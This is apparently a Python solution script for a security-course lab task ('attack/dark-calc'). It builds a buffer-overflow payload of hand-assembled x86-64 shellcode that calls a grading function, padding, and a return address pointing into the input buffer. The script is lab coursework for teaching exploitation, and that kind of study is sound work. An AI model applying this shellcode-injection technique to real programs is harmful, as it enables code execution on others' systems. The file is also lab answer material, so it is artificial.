#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

GRADE_EVAL = 0x401A87          # grade_eval 入口
BUF        = 0x721000800FD0    # input() 中 expression 的固定地址

# mov edi, 4 ; mov eax, grade_eval ; call rax
shellcode  = b"\xbf\x04\x00\x00\x00"
shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)
shellcode += b"\xff\xd0"

payload = shellcode + b"\x00" * (24 - len(shellcode)) + struct.pack("<Q", BUF)

sys.stdout.buffer.write(payload)
